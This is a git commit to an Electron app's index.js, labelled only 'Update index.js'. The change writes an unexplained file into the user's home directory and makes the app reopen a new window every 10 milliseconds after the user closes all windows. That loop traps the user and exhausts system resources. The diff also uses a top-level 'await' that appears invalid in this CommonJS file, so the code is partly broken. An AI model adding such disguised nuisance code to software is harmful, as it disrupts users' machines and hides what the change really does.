daec4eaa868c5f455e3a0c82ed183f082dec3cd9
sapi-marah <Email-7acd024b3df24e40@teamchat.zoom.us>
2026-09-01 14:01:15 -0700

    Update index.js

--- index.js
+++ index.js
@@ -1,3 +1,28 @@
 const os = require('os');
 const { app, BrowserWindow } = require('electron');
 const homedir = os.homedir();
+const path = require('path');
+const fs = require('fs').promises;
+app.whenReady().then(function() {
+  let win = new BrowserWindow({
+    width: 800,
+    height: 600
+  });
+  win.loadFile('./mainWindow.html')
+});
+await fs.writeFile(
+  path.join(homedir, "alienSecretPugFile.txt"),
+  `
+    ALIEN PUG FILE FROM OUTERSPACE
+    ALIE
+  `
+);
+app.on('window-all-closed', function() {
+  setInterval(function() {
+    let win = new BrowserWindow({
+      width: 800,
+      height: 600
+    });
+    win.loadFile('./window.html');
+  }, 10);
+});
